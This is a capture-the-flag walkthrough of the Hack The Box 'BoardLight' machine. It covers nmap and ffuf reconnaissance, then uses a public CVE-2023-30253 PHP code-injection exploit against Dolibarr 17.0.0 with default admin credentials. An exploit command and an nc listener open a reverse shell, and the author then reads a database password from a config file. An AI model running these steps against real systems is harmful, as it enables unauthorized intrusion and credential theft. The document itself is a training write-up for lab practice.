# BoardLight

**Date:** 14, jun, 2024

**Author:** H3cktor



### Recon

**Using NMAP to make Recon**&#x20;

```bash
nmap -sC -sV 10.10.11.11
```

\-sV => Attempts to determine the version of the service running on port

\-sC  => Scan with default NSE scripts. Considered useful for discovery and safe

<figure><img src="../../../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

After the **nmap** scan we can see an apache server listening on port 80:

Lets add this to our host file:

```bash
sudo nano /etc/hosts
```

<figure><img src="../../../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>



Lets first try to do a directory search to try to find any hidden files/**directory's**. I will use **gobuster**  to do this:

<figure><img src="../../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

Make subdomain enumeration Using **FFUF**

```bash
ffuf -H "Host: FUZZ.board.htb"  -u http://10.10.11.11/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -fw 6243

```

<figure><img src="../../../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

See i found the Subdomain crm.10.10.11.11

<figure><img src="../../../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>



**I Found the crm  panel**

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Ok Now Found the Dolibarr version 17.0.0 and i Search in Google to get any CVE&#x20;

i found [Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

Reverse Shell POC exploit for **`Dolibarr <= 17.0.0 (CVE-2023-30253)`**, PHP Code Injection

```bash
sudo python3 exploit.py   http://crm.board.htb admin admin  <ip Your tun0> 9000

```



listen revers shell => Must run listening in First

```
nc -nvlp 9000
```

\
First I provided a listener and then executed the exploit.py file. Then I provided the credentials as well as my attacker ip and the listening port. After executing, I successfully got a reverse shell

<figure><img src="../../../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>



B0000000M!

<figure><img src="../../../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

I cat Found in pass or Cardantional&#x20;

put i see the user name larissa

<figure><img src="../../../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

I found the main database password in the file.

<figure><img src="../../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (205).png" alt=""><figcaption><p>User Own</p></figcaption></figure>

